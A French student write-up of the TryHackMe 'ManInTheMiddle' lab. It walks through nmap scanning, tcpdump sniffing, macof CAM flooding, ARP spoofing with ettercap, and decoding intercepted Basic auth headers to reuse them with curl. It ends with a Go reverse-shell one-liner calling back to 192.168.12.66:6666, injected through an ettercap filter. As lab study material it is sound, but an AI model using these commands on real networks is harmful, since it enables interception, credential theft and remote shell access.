# 🏆 Challenge C503: Pentest interne
### François BARSOTTI
## 🎯 Pitch et Contexte du challenge

>Créer un compte sur TryHackMe, puis réaliser les labs suivants :
>
>* [ManInTheMiddle](https://tryhackme.com/room/layer2)
>* Optionnel : [Nmap]https://tryhackme.com/room/furthernmap

Voir 👉 [Cours C503](https://github.com/FrancoisBarsotti-Oclock/Cybersecurity/blob/main/Portfolio/CoursAIS/Bloc%20C%20(Administrateur%20Cybers%C3%A9curit%C3%A9)/Saison_C5%20(Pentesting)/C503_Pentest%20interne.md)

## Man In The Middle 👀

## Connexion à la VM & reconnaissance de réseau (étapes 1 à 3) 🔎

Selon description, cette connexion SSH est faite sur interface Ethernet `eth0`, à tenir en compte tout au long des exercices.

```nginx
# Connexion à la VM
ssh -o StrictHostKeyChecking=accept-new admin@10.130.x.x

# découverte de l'interface eth1
ip a s eth1 # (ip address show eth1)

# Pour connaitre le nombre d'hôtes qu'y vivent (hosts live) 
nmap -sn <ip CIDR>| grep "Nmap scan report for" | wc -l

# Pour voir uniquement les noms des hôtes
nmap -sn <ip CIDR>

# Une autre façon de tout voir (même les services) en mode Fast, agressif, verbose et en évitant des faux positifs (car en pentest on va de toute façon devoir scanner les ports)
nmap -sV -F -T5 <ip CIDR> -v -Pn
```

![1-Connexion et reconnaissance]()

## Analyse passive du réseau (étapes 4 à 6) 🌐

On doit utiliser `tcpdump` pour essayer de sniffer l'interface eth1

```nginx
# Pour uniquement intercepter de paquets en eth1
tcpdump -i eth1

# (celle qui nous intéresse) Même interception mais avec enregistrement vers un fichier pcap via l’argument -w, qui pourra être récupéré après avec Wireshark
tcpdump -A -i eth1 -w /tmp/tcpdump.pcap

# Transfert de capture de paquet par scp et ouverture sur Wireshark (depuis la machine locale avec Wireshark installé)
scp admin@<ip attaquant>:/tmp/tcpdump.pcap .
#Puis on va sur wireshark pour ouvrir le tcpdump.pcap

# La capture peut aussi être transférée via sftp
sftp -o StrictHostKeyChecking=accept-new admin@ip attaquant

# Débug, en cas de refus de permission (effacer le fichier pour redémarrer le tcpdump)
rm -f /tmp/*.pcap
```

![02-pcap1 sur Wireshark]()

Sur cette première VM, on doit se connecter (deux fois) pour lancer l'attaque avec une `macof` (envoi de trames sur tous le ports, pour transformer le switch en hub en saturant sa table-cam).
à la fin de cette partie, on fera un essai de ARP poisoning, qui ne marchera pas car les machines de cette VM sont intentionnellement protégés. Pour l'attaque, il faudra ouvrir une autre connexion (à revoir juste après).

```yaml
# sur la première connexion on lance l'enregistrement de paquets
tcpdump -A -i eth1 -w /tmp/tcpdump2.pcap

# Sur la deuxième connexion (de la même VM) on lance l'envoi de trames masives
macof -i eth1

# attaque MITM basée sur ARP spoofing mode texte avec Ettercap
ettercap -T -i eth1 -M arp
```

![03-pcap2 sur Wireshark]()

💡 **Note** : Pour voir les pings entre les deux machines sniffées, on peut filtrer la recherche sur Wireshark en tappant "icmp"

## Sniffing & Manipulation (étapes 7 & 8) 🔛

Comme dit avant, les machines sont intentionnellement protégés pour que la dernière commande ne fasse pas son effet. Alors, pour la suite, on est invité à se déconnecter de la première VM pour se connecter sur une autre VM (avec deux sessions aussi)

```nginx
# Connexion à la VM
ssh -o StrictHostKeyChecking=accept-new admin@10.130.x.x

# Scanner le réseau eth1 pour avoir les ip présentes avec leurs noms
nmap -sn <ip cible CIDR>

# Pour avoir tous leurs ports ouverts
nmap -sS ip_machine1 ip_machine2

# Lancer l'attaque d'ARP spoofing
ettercap -T -i eth1 -M arp

# Quand on trouve un header nommé "Autorization", on sait qu'il réprésente une authentification basique (base64), alors on le décode pour obtenir les identifiants en clair
echo "mdp haché (sans point)" | base64 -d

# à partir de ce moment on peut faire un "curl" sur la machine dont on a obtenu le mot de passe (dasn ce cas, Bob), avec le header qu'on a récupéré avec ettercap.
curl http://<ip>/ -H "<Header récupéré(sans point)>"

# Si l'on rajoute un GET sur le test.txt qu'on voit sur les paquets enregistrés, on obtient le contenu de user.txt et son flag
curl http://<ip>/user.txt -H "<Header récupéré(sans point)>"

# Pour connaître les commandes que sont en exécution sur les machines sniffées, on fait un netcat en signalant le numéro de port pour s'y connecter
nc <ip attaqué> 444

# Pour altérer les paquets qui transitent (et remplacer la commande whoami par une commande qui nous permettra de faire un reverse shell), on écrit un fichier nano avec les functions à appliquer (ne pas oublier de finir la commande avec un point-virgule)
echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"192.168.12.66:6666\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go &

# Pour exécuter le fichier nano
etterfilter filter.ecf -o filter.ef
```

Et c'est comme ça qu'on arrive à tout finir 🙂​

![00-Challenge completed]()

---

